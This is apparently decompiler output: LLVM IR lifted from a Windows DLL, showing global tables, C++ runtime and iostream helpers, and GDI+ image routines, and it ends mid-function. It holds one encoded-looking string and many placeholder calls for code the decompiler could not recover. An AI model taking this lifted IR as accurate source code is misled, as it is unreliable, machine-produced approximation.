@global_var_1003c110 = constant i32 -28
@global_var_10041b04 = local_unnamed_addr global i32 0
@global_var_100333b6 = local_unnamed_addr constant i32 0
@global_var_1003c170 = constant i32 -2
@global_var_1003fd48 = local_unnamed_addr global i32 0
@global_var_1003fd4c = local_unnamed_addr global i32 0
@global_var_1003fd44 = local_unnamed_addr global i32 0
@global_var_1003fd50 = global i32 0
@global_var_1003e480 = global i32 0
@global_var_1003e588 = global i32 0
@global_var_1003e8a7 = global i32 65439744
@global_var_1003c150 = constant i32 -2
@global_var_1003e8a9 = global i32 1049574
@global_var_10031998 = constant i32 1410065408
@global_var_10032334 = constant i32 487260709
@global_var_1003428c = constant [6 x i8] c"1#IND\00"
@global_var_10034284 = constant [7 x i8] c"1#SNAN\00"
@global_var_1003427c = constant [7 x i8] c"1#QNAN\00"
@global_var_10034274 = constant [6 x i8] c"1#INF\00"
@global_var_1003fd84 = local_unnamed_addr global i32 0
@global_var_100388d0 = local_unnamed_addr constant [6 x i8] c"log10\00"
@global_var_1003b190 = local_unnamed_addr constant i32 429065506
@global_var_1003b1bc = local_unnamed_addr constant i32 429065506
@global_var_1003b1f0 = local_unnamed_addr constant i32 429065506
@global_var_1003b274 = local_unnamed_addr constant i32 429065506
@global_var_1003ef48 = local_unnamed_addr global i32 0
@global_var_1003f068 = local_unnamed_addr global i32 0
@global_var_1003f010 = local_unnamed_addr global i32 0
@global_var_1003f0fc = local_unnamed_addr global i32 0
@global_var_1003f0f4 = local_unnamed_addr global i32 0
@global_var_1003f181 = local_unnamed_addr global i32 0
@global_var_1003f180 = local_unnamed_addr global i32 0
@global_var_1003e068 = local_unnamed_addr global i32 10
@4 = external global i32
@global_var_10039c75 = external constant i8*
@global_var_1003a0a0 = external local_unnamed_addr constant i128
@global_var_10039f60 = external local_unnamed_addr constant i128
@global_var_1003a000 = external local_unnamed_addr constant i128
@global_var_1003a120 = external local_unnamed_addr constant i128
@global_var_10040d98 = global i16* null
@global_var_1003a010 = external local_unnamed_addr constant i128
@global_var_10040598 = global i16* null
@global_var_100410b0 = global i16* null
@global_var_10040fa0 = global i16 0
@global_var_10040fac = local_unnamed_addr global i16 0
@global_var_10040faa = local_unnamed_addr global i16 0
@global_var_10040fa8 = local_unnamed_addr global i16 0
@global_var_10040fa6 = local_unnamed_addr global i16 0
@global_var_10040fa2 = local_unnamed_addr global i16 0
@global_var_1003fd90 = global i16* null
@global_var_10039dd0 = external local_unnamed_addr constant i128
@global_var_10039df0 = external local_unnamed_addr constant i128
@global_var_10039e00 = external local_unnamed_addr constant i128
@global_var_10039de0 = external local_unnamed_addr constant i128
@global_var_10039e10 = external local_unnamed_addr constant i128
@global_var_10039fa0 = external local_unnamed_addr constant i128
@global_var_10039fc0 = external local_unnamed_addr constant i128
@global_var_10039ef0 = external local_unnamed_addr constant i128
@global_var_1003a150 = external local_unnamed_addr constant i128
@global_var_10039d88 = external local_unnamed_addr constant i128
@global_var_10041af0 = global void ()* null
@global_var_10041a04 = global i32** null
@5 = internal constant [2 x i8] c"\0A\00"
@6 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@global_var_1003a130 = external local_unnamed_addr constant i128
@global_var_10039e40 = external local_unnamed_addr constant i128
@global_var_10039eb0 = external local_unnamed_addr constant i128
@global_var_1003e9f0 = local_unnamed_addr global i64 8030875174627502319
@global_var_1003a0f0 = external local_unnamed_addr constant i128
@global_var_100395c4 = constant i16* inttoptr (i32 87 to i16*)
@global_var_100395c8 = constant i16* inttoptr (i32 80 to i16*)
@global_var_1003a070 = external local_unnamed_addr constant i128
@global_var_10039e80 = external local_unnamed_addr constant i128
@global_var_1003a100 = external local_unnamed_addr constant i128
@global_var_10039f50 = external local_unnamed_addr constant i128
@global_var_10039e90 = external local_unnamed_addr constant i128
@global_var_10039ec0 = external local_unnamed_addr constant i128
@global_var_10039e60 = external local_unnamed_addr constant i128
@global_var_100419d8 = global i16* null
@7 = internal constant [14 x i8] c"MWuFQPJLM\7FqVM\00"
@global_var_10039ad4 = constant i8* getelementptr inbounds ([14 x i8], [14 x i8]* @7, i32 0, i32 0)
@global_var_10039f40 = external local_unnamed_addr constant i128
@global_var_1003a060 = external local_unnamed_addr constant i128
@global_var_1003a040 = external local_unnamed_addr constant i128
@global_var_10039698 = local_unnamed_addr constant i8 0
@global_var_100396a0 = local_unnamed_addr constant i16 38
@global_var_100396a4 = local_unnamed_addr constant i16 61
@global_var_1003a080 = external local_unnamed_addr constant i128
@global_var_10039e50 = external local_unnamed_addr constant i128
@global_var_10039f80 = external local_unnamed_addr constant i128
@global_var_1003a020 = external local_unnamed_addr constant i128
@global_var_10039f70 = external local_unnamed_addr constant i128
@global_var_1003a050 = external local_unnamed_addr constant i128
@global_var_10039ed0 = external local_unnamed_addr constant i128
@global_var_10039ff0 = external local_unnamed_addr constant i128
@global_var_10039f10 = external local_unnamed_addr constant i128
@global_var_10039f20 = external local_unnamed_addr constant i128
@global_var_1003a090 = external local_unnamed_addr constant i128
@global_var_10039fe0 = external local_unnamed_addr constant i128
@global_var_10039f30 = external local_unnamed_addr constant i128
@global_var_1003a030 = external local_unnamed_addr constant i128
@global_var_1003a0b0 = external local_unnamed_addr constant i128
@global_var_1003a0d0 = external local_unnamed_addr constant i128
@global_var_10039ea0 = external local_unnamed_addr constant i128
@global_var_1003a0e0 = external local_unnamed_addr constant i128
@global_var_10039f00 = external local_unnamed_addr constant i128
@global_var_1003a0c0 = external local_unnamed_addr constant i128
@global_var_10039fd0 = external local_unnamed_addr constant i128
@global_var_10039f90 = external local_unnamed_addr constant i128
@global_var_10039ee0 = external local_unnamed_addr constant i128
@global_var_10039e70 = external local_unnamed_addr constant i128
@global_var_1003a140 = external local_unnamed_addr constant i128
@global_var_10039fb0 = external local_unnamed_addr constant i128
@global_var_1003a110 = external local_unnamed_addr constant i128
@global_var_10039e20 = external local_unnamed_addr constant i128
@global_var_10039a98 = local_unnamed_addr constant i8 0
@global_var_10039aa8 = local_unnamed_addr constant i8 0
@global_var_10039ab0 = local_unnamed_addr constant i8 0
@global_var_1003f2a0 = global %_RTL_CRITICAL_SECTION* null
@global_var_1003f604 = local_unnamed_addr global i8 0
@global_var_1003f634 = global i16* null
@global_var_1003079c = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 1 to %_RTL_CRITICAL_SECTION*)
@global_var_1003f6e0 = local_unnamed_addr global i8 0
@global_var_1003e2f4 = local_unnamed_addr global i8 -2
@global_var_10033330 = local_unnamed_addr constant x86_fp80 0xK7FFF8000000000000000
@global_var_10032364 = local_unnamed_addr constant double 5.000000e-01
@global_var_1003f840 = external global i8*
@global_var_1003fd78 = external local_unnamed_addr global i8*
@global_var_1003fd70 = external local_unnamed_addr global i8*
@global_var_1003f9c0 = external global i8*
@8 = internal constant [2 x i8] c"\04\00"
@global_var_10032990 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @8, i32 0, i32 0)
@9 = internal constant [2 x i8] c"\04\00"
@global_var_10032988 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @9, i32 0, i32 0)
@10 = internal constant [2 x i8] c"\04\00"
@global_var_100329bc = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @10, i32 0, i32 0)
@global_var_100329b4 = constant %_RTL_CRITICAL_SECTION* inttoptr (i32 8 to %_RTL_CRITICAL_SECTION*)
@11 = internal constant [2 x i8] c"\05\00"
@global_var_100329e0 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @11, i32 0, i32 0)
@global_var_1003e2f0 = global i16* inttoptr (i32 67 to i16*)
@global_var_10032bb8 = constant i16* inttoptr (i32 67 to i16*)
@global_var_1003e8b0 = external global i8*
@global_var_10032404 = local_unnamed_addr constant i64 38654705667
@global_var_10032408 = local_unnamed_addr constant i64 9
@global_var_10033280 = external local_unnamed_addr constant i128
@global_var_10033290 = external local_unnamed_addr constant i128
@global_var_10035048 = constant i64* null
@global_var_10035460 = constant i128* null
@global_var_100332d8 = local_unnamed_addr constant i64 -134217728
@global_var_10035c70 = constant i64* null
@global_var_10036080 = constant i128* null
@global_var_100332e0 = local_unnamed_addr constant i64 -4614195897457180672
@global_var_10036890 = constant i64* inttoptr (i32 1073741824 to i64*)
@global_var_100370a0 = constant i128* null
@global_var_100380b0 = external local_unnamed_addr constant i128
@global_var_100380c0 = external local_unnamed_addr constant i128
@global_var_10033270 = local_unnamed_addr constant i64 4843621399236968448
@global_var_100380d0 = constant i128* null
@global_var_100332b0 = external local_unnamed_addr constant i128
@global_var_100332d0 = local_unnamed_addr constant i64 4604418534313441775
@global_var_100332c0 = external local_unnamed_addr constant i128
@global_var_100332a0 = external local_unnamed_addr constant i128
@global_var_10033300 = local_unnamed_addr constant double -0.000000e+00
@global_var_100332f8 = local_unnamed_addr constant double 0xFFF0000000000000
@global_var_100332e8 = local_unnamed_addr constant i64 9218868437227405313
@global_var_10033320 = local_unnamed_addr constant i64 -2251799813685248
@global_var_100332f0 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_10033318 = local_unnamed_addr constant i64 4503599627370496
@global_var_10033308 = local_unnamed_addr constant i64 -9007199254740992
@global_var_10033310 = local_unnamed_addr constant i64 9214364837600034816
@global_var_1003333a = local_unnamed_addr constant x86_fp80 0xKFFFF8000000000000000
@global_var_1003334e = local_unnamed_addr constant x86_fp80 0xK400DFFFF000000000000
@global_var_10033362 = local_unnamed_addr constant double 5.000000e-01
@global_var_100333ae = local_unnamed_addr constant double 1.000000e+00
@global_var_100333a4 = local_unnamed_addr constant x86_fp80 0xK3FFEC90FD7E45803CD14
@global_var_1003fd60 = local_unnamed_addr global i8 0
@12 = internal constant [2 x i8] c"0\00"
@global_var_10034270 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @12, i32 0, i32 0)
@global_var_1003229e = external constant i8*
@global_var_1003229f = external constant i8*
@global_var_1003229c = constant i16* inttoptr (i32 20633 to i16*)
@global_var_10038940 = external local_unnamed_addr constant i128
@global_var_10038950 = external local_unnamed_addr constant i128
@global_var_100389b0 = external local_unnamed_addr constant i128
@global_var_10038960 = external local_unnamed_addr constant i128
@global_var_10038970 = external local_unnamed_addr constant i128
@global_var_10038e50 = constant i128* null
@global_var_10038a40 = constant i128* null
@global_var_10038a00 = external local_unnamed_addr constant i128
@global_var_10038a10 = external local_unnamed_addr constant i128
@global_var_10038a20 = external local_unnamed_addr constant i128
@global_var_10038980 = external local_unnamed_addr constant i128
@global_var_10038990 = constant i128* null
@global_var_10038a30 = external local_unnamed_addr constant i128
@global_var_100389c0 = external local_unnamed_addr constant i128
@global_var_100389e8 = local_unnamed_addr constant double 0x7FF0000000000000
@global_var_100389e0 = local_unnamed_addr constant i64 -4503599627370496
@global_var_100389d0 = local_unnamed_addr constant i64 4841369599423283200
@global_var_1002d3b4 = constant %vtable_1002d3b4_type { i32 (i8)* @function_100012c0, i32 ()* @function_100012b0 }
@global_var_1002d3cc = constant %vtable_1002d3cc_type { i32 (i8)* @function_100012c0, i32 ()* @function_100012b0 }
@global_var_1002d434 = constant %vtable_1002d434_type { i32 (i8)* @function_10001c30, i32 ()* @function_100012b0 }
@global_var_1002d44c = constant %vtable_1002d44c_type { i32 (i8)* @function_10001910, i32 ()* @function_10001da0, i32 (i32, i32)* @function_10001db0, i32 (i32, i32)* @function_10001970, i32 (i32, i32)* @function_100019d0, i32 (i32, i32)* @function_10001990 }
@vtable_1002d474 = local_unnamed_addr global %vtable_1002d474_type { i32 (i32)* @"??_Gios_base@std@@UAEPAXI@Z" }
@vtable_1002d4bc = local_unnamed_addr global %vtable_1002d4bc_type { i32 (i32)* @"??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ", i32 ()* @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ.3", i32 ()* @function_1000f49b, i32 (i32)* @"?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z", i32 ()* @function_1000f8ea, i32 ()* @"?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 ()* @function_1000f927, i32 (i32, i32, i32)* @function_1000fb42, i32 (i32, i32, i32)* @function_1000fc30, i32 (i64, i32, i32)* @"?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z", i32 (i32, i32)* @"?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z", i32 (i8*, i64)* @"?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z", i32 ()* @"?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ", i32 (i32*)* @"?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z" }
@vtable_1002d4fc = local_unnamed_addr global %vtable_1002d4fc_type { i32 (i32)* @"??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z" }
@vtable_1002d504 = local_unnamed_addr global %vtable_1002d504_type { i32 (i32)* @function_1000eee1 }
@vtable_1002d558 = local_unnamed_addr global %vtable_1002d558_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@vtable_1002d574 = local_unnamed_addr global %vtable_1002d574_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@vtable_1002d58c = local_unnamed_addr global %vtable_1002d58c_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@global_var_1002e09c = constant %vtable_1002e09c_type { i32 (i8)* @function_10005310, i32 ()* @function_100015b0, i32 ()* @function_100015c0, i32 (i32, i32, i32, i32, i32, i32)* @function_100047c0, i32 (i32, i32, i32, i32, i32, i64)* @function_10004830, i32 (i32, i32, i32, i32, i32, i64)* @function_10004a00, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004bd0, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004c50, i32 (i32, i32, i32, i32, i32, i32)* @function_10004cd0, i32 (i32, i32, i32, i32, i32, i32)* @function_10004d50, i32 (i32, i32, i32, i32, i8, i8)* @function_10004dd0 }
@global_var_1002e0cc = constant %vtable_1002e0cc_type { i32 (i8)* @function_100062d0, i32 ()* @function_100015b0, i32 ()* @function_100015c0, i32 ()* @function_10005440, i32 ()* @function_10005430, i32 (i32)* @function_100053e0, i32 (i32)* @function_10005390, i32 (i32)* @function_10005340 }
@vtable_10030658 = local_unnamed_addr global %vtable_10030658_type { i32 (i32)* @"??_G_Ref_count_base@std@@UAEPAXI@Z" }
@vtable_10030664 = local_unnamed_addr global %vtable_10030664_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_100012b0 }
@global_var_10039d30 = constant %vtable_10039d30_type { i32 (i32)* @function_100011b0, i32 ()* @function_100011f0 }
@global_var_1003958c = constant [2 x i8] c"\0A\00"

define i32 @function_10001000() local_unnamed_addr {
dec_label_pc_10001000:
  %0 = call i32 @function_10006e60(), !insn.addr !0
  store i32 0, i32* @global_var_10041ac4, align 4, !insn.addr !1
  store i32 15, i32* @global_var_10041ac8, align 4, !insn.addr !2
  store i8 0, i8* bitcast (i32* @global_var_10041ab4 to i8*), align 4, !insn.addr !3
  %1 = call i32 @_atexit(void ()* inttoptr (i32 268615984 to void ()*)), !insn.addr !4
  ret i32 %1, !insn.addr !5
}

define i32 @function_100010a0() local_unnamed_addr {
dec_label_pc_100010a0:
  %0 = call i32 @"??0_Init_cout@std@@QAE@XZ"(), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i32 @function_100010c0(void ()* %func) local_unnamed_addr {
dec_label_pc_100010c0:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !7
  ret i32 %0, !insn.addr !8
}

define i32 @function_100010cc(void ()* %func) local_unnamed_addr {
dec_label_pc_100010cc:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !9
  ret i32 %0, !insn.addr !10
}

define i32 @function_100010d8(void ()* %func) local_unnamed_addr {
dec_label_pc_100010d8:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !11
  ret i32 %0, !insn.addr !12
}

define i32 @function_10001100(void ()* %func) local_unnamed_addr {
dec_label_pc_10001100:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !13
  ret i32 %0, !insn.addr !14
}

define i32 @function_10001110() local_unnamed_addr {
dec_label_pc_10001110:
  ret i32 ptrtoint (i32* @global_var_10041ad0 to i32), !insn.addr !15
}

define i32 @function_10001120(i8* %arg1) local_unnamed_addr {
dec_label_pc_10001120:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @___acrt_iob_func(i32 1, i32 %0, i32 %1), !insn.addr !16
  %3 = call i32 @function_10001110(), !insn.addr !17
  %4 = add i32 %3, 4, !insn.addr !18
  %5 = inttoptr i32 %4 to i32*, !insn.addr !18
  %6 = load i32, i32* %5, align 4, !insn.addr !18
  %7 = inttoptr i32 %3 to i32*, !insn.addr !19
  %8 = load i32, i32* %7, align 4, !insn.addr !19
  %9 = call i32 @___stdio_common_vfprintf(i32 %8, i32 %6), !insn.addr !20
  ret i32 %9, !insn.addr !21
}

define i32 @function_10001150(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10001150:
  %0 = call i32 @function_10001110(), !insn.addr !22
  %1 = add i32 %0, 4, !insn.addr !23
  %2 = inttoptr i32 %1 to i32*, !insn.addr !23
  %3 = load i32, i32* %2, align 4, !insn.addr !23
  %4 = inttoptr i32 %0 to i32*, !insn.addr !24
  %5 = load i32, i32* %4, align 4, !insn.addr !24
  %6 = call i32 @___stdio_common_vsprintf_s(i32 %5, i32 %3), !insn.addr !25
  %7 = icmp sgt i32 %6, -1, !insn.addr !26
  %8 = select i1 %7, i32 %6, i32 -1, !insn.addr !27
  ret i32 %8, !insn.addr !28
}

define i32 @function_10001190(i32* %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001190:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_16 = alloca i32, align 4
  %3 = ptrtoint i8* %arg3 to i32, !insn.addr !29
  %4 = call i32 @function_10001150(i32 %2, i32 %arg2, i32 %3, i32 0, i32* nonnull %stack_var_16, i32 %1, i32 %0), !insn.addr !29
  ret i32 %4, !insn.addr !30
}

define i32 @function_100011b0(i32 %arg1) {
dec_label_pc_100011b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !31
  %2 = inttoptr i32 %1 to i32*, !insn.addr !31
  %3 = load i32, i32* %2, align 4, !insn.addr !31
  %4 = inttoptr i32 %0 to i32*, !insn.addr !32
  store i32 ptrtoint (i32* @global_var_10039d3c to i32), i32* %4, align 4, !insn.addr !32
  %5 = inttoptr i32 %3 to i32*, !insn.addr !33
  %6 = call i32 @GdipDisposeImage(i32* %5), !insn.addr !33
  %7 = and i32 %arg1, 1
  %8 = icmp eq i32 %7, 0, !insn.addr !34
  br i1 %8, label %dec_label_pc_100011e9, label %dec_label_pc_100011cc, !insn.addr !35

dec_label_pc_100011cc:                            ; preds = %dec_label_pc_100011b0
  %9 = and i32 %arg1, 4
  %10 = icmp eq i32 %9, 0, !insn.addr !36
  %11 = icmp eq i1 %10, false, !insn.addr !37
  br i1 %11, label %dec_label_pc_100011de, label %dec_label_pc_100011d0, !insn.addr !37

dec_label_pc_100011d0:                            ; preds = %dec_label_pc_100011cc
  call void @GdipFree(i32* %4), !insn.addr !38
  ret i32 %0, !insn.addr !39

dec_label_pc_100011de:                            ; preds = %dec_label_pc_100011cc
  %12 = call i32 @function_10004390(), !insn.addr !40
  br label %dec_label_pc_100011e9, !insn.addr !41

dec_label_pc_100011e9:                            ; preds = %dec_label_pc_100011de, %dec_label_pc_100011b0
  ret i32 %0, !insn.addr !42
}

define i32 @function_100011f0() {
dec_label_pc_100011f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !43
  %1 = bitcast i32* %stack_var_-8 to i32**
  %2 = add i32 %0, 4, !insn.addr !44
  %3 = inttoptr i32 %2 to i32*, !insn.addr !44
  %4 = load i32, i32* %3, align 4, !insn.addr !44
  %5 = inttoptr i32 %4 to i32*, !insn.addr !45
  %6 = call i32 @GdipCloneImage(i32* %5, i32** nonnull %1), !insn.addr !45
  %7 = icmp eq i32 %6, 0, !insn.addr !46
  br i1 %7, label %dec_label_pc_10001212, label %dec_label_pc_1000120f, !insn.addr !47

dec_label_pc_1000120f:                            ; preds = %dec_label_pc_100011f0
  %8 = add i32 %0, 8, !insn.addr !48
  %9 = inttoptr i32 %8 to i32*, !insn.addr !48
  store i32 %6, i32* %9, align 4, !insn.addr !48
  br label %dec_label_pc_10001212, !insn.addr !48

dec_label_pc_10001212:                            ; preds = %dec_label_pc_1000120f, %dec_label_pc_100011f0
  %10 = call i32* @GdipAlloc(i32 16), !insn.addr !49
  %11 = icmp eq i32* %10, null, !insn.addr !50
  br i1 %11, label %dec_label_pc_10001235, label %dec_label_pc_1000121e, !insn.addr !51

dec_label_pc_1000121e:                            ; preds = %dec_label_pc_10001212
  %12 = ptrtoint i32* %10 to i32, !insn.addr !49
  %13 = add i32 %0, 8, !insn.addr !52
  %14 = inttoptr i32 %13 to i32*, !insn.addr !52
  %15 = load i32, i32* %14, align 4, !insn.addr !52
  %16 = load i32, i32* %stack_var_-8, align 4, !insn.addr !53
  store i32 ptrtoint (i32* @global_var_10039d3c to i32), i32* %10, align 4, !insn.addr !54
  %17 = add i32 %12, 4, !insn.addr !55
  %18 = inttoptr i32 %17 to i32*, !insn.addr !55
  store i32 %16, i32* %18, align 4, !insn.addr !55
  %19 = add i32 %12, 8, !insn.addr !56
  %20 = inttoptr i32 %19 to i32*, !insn.addr !56
  store i32 %15, i32* %20, align 4, !insn.addr !56
  ret i32 %12, !insn.addr !57

dec_label_pc_10001235:                            ; preds = %dec_label_pc_10001212
  ret i32 0, !insn.addr !58
}

define i32 @"??0exception@std@@QAE@QBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001240:
  %0 = call i128 @__decompiler_undefined_function_4()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !59
  %3 = add i32 %1, 4, !insn.addr !60
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %result, align 4, !insn.addr !61
  %4 = inttoptr i32 %3 to i64*, !insn.addr !62
  %5 = load i64, i64* %4, align 4, !insn.addr !62
  call void @__asm_movq.40(i64 %5, i128 %2), !insn.addr !62
  %6 = call i32 @___std_exception_copy(), !insn.addr !63
  ret i32 %1, !insn.addr !64
}

define i32 @"??0exception@std@@QAE@ABV01@@Z"(i32* %result, i32* %arg2) local_unnamed_addr {
dec_label_pc_10001280:
  %0 = call i128 @__decompiler_undefined_function_4()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !65
  %3 = add i32 %1, 4, !insn.addr !66
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %result, align 4, !insn.addr !67
  %4 = inttoptr i32 %3 to i64*, !insn.addr !68
  %5 = load i64, i64* %4, align 4, !insn.addr !68
  call void @__asm_movq.40(i64 %5, i128 %2), !insn.addr !68
  %6 = call i32 @___std_exception_copy(), !insn.addr !69
  ret i32 %1, !insn.addr !70
}

define i32 @function_100012b0() {
dec_label_pc_100012b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !71
  %2 = inttoptr i32 %1 to i32*, !insn.addr !71
  %3 = load i32, i32* %2, align 4, !insn.addr !71
  %4 = icmp eq i32 %3, 0, !insn.addr !72
  %5 = icmp eq i1 %4, false, !insn.addr !73
  %6 = select i1 %5, i32 %3, i32 ptrtoint ([18 x i8]* @global_var_10039c38 to i32), !insn.addr !73
  ret i32 %6, !insn.addr !74
}

define i32 @function_100012c0(i8 %arg1) {
dec_label_pc_100012c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !75
  %4 = inttoptr i32 %2 to i32*, !insn.addr !76
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !76
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !77
  %6 = and i8 %arg1, 1, !insn.addr !78
  %7 = icmp eq i8 %6, 0, !insn.addr !78
  br i1 %7, label %dec_label_pc_100012e9, label %dec_label_pc_100012de, !insn.addr !79

dec_label_pc_100012de:                            ; preds = %dec_label_pc_100012c0
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !80
  br label %dec_label_pc_100012e9, !insn.addr !81

dec_label_pc_100012e9:                            ; preds = %dec_label_pc_100012de, %dec_label_pc_100012c0
  ret i32 %2, !insn.addr !82
}

define i32 @function_100012f0(i8* %arg1) local_unnamed_addr {
dec_label_pc_100012f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !83
  %3 = add i32 %0, 4, !insn.addr !84
  %4 = inttoptr i32 %0 to i32*, !insn.addr !85
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !85
  %5 = inttoptr i32 %3 to i64*, !insn.addr !86
  %6 = load i64, i64* %5, align 4, !insn.addr !86
  call void @__asm_movq.40(i64 %6, i128 %2), !insn.addr !86
  %7 = call i32 @___std_exception_copy(), !insn.addr !87
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %4, align 4, !insn.addr !88
  ret i32 %0, !insn.addr !89
}

define i32 @"??0bad_cast@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001350:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !90
  %3 = add i32 %0, 4, !insn.addr !91
  %4 = inttoptr i32 %3 to i64*, !insn.addr !91
  %5 = load i64, i64* %4, align 4, !insn.addr !91
  call void @__asm_movq.40(i64 %5, i128 %2), !insn.addr !91
  %6 = inttoptr i32 %3 to i32*, !insn.addr !92
  store i32 ptrtoint ([9 x i8]* @global_var_10039c4c to i32), i32* %6, align 4, !insn.addr !92
  %7 = inttoptr i32 %0 to i32*, !insn.addr !93
  store i32 ptrtoint (%vtable_1002d3cc_type* @global_var_1002d3cc to i32), i32* %7, align 4, !insn.addr !93
  ret i32 %0, !insn.addr !94
}

define i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001370:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !95
  %eax.0.reg2mem = alloca i32, !insn.addr !95
  %0 = ptrtoint i8* %arg2 to i32
  %1 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !96
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !97
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !98
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !99
  store i32 0, i32* %stack_var_-44, align 4, !insn.addr !100
  %4 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %1), !insn.addr !101
  %5 = add i32 %1, 4, !insn.addr !102
  %6 = inttoptr i32 %5 to i32*, !insn.addr !102
  store i32 0, i32* %6, align 4, !insn.addr !102
  %7 = add i32 %1, 8, !insn.addr !103
  %8 = inttoptr i32 %7 to i8*, !insn.addr !103
  store i8 0, i8* %8, align 1, !insn.addr !103
  %9 = add i32 %1, 12, !insn.addr !104
  %10 = inttoptr i32 %9 to i32*, !insn.addr !104
  store i32 0, i32* %10, align 4, !insn.addr !104
  %11 = add i32 %1, 16, !insn.addr !105
  %12 = inttoptr i32 %11 to i8*, !insn.addr !105
  store i8 0, i8* %12, align 1, !insn.addr !105
  %13 = add i32 %1, 20, !insn.addr !106
  %14 = inttoptr i32 %13 to i32*, !insn.addr !106
  store i32 0, i32* %14, align 4, !insn.addr !106
  %15 = add i32 %1, 24, !insn.addr !107
  %16 = inttoptr i32 %15 to i16*, !insn.addr !107
  store i16 0, i16* %16, align 2, !insn.addr !107
  %17 = add i32 %1, 28, !insn.addr !108
  %18 = inttoptr i32 %17 to i32*, !insn.addr !108
  store i32 0, i32* %18, align 4, !insn.addr !108
  %19 = add i32 %1, 32, !insn.addr !109
  %20 = inttoptr i32 %19 to i16*, !insn.addr !109
  store i16 0, i16* %20, align 2, !insn.addr !109
  %21 = add i32 %1, 36, !insn.addr !110
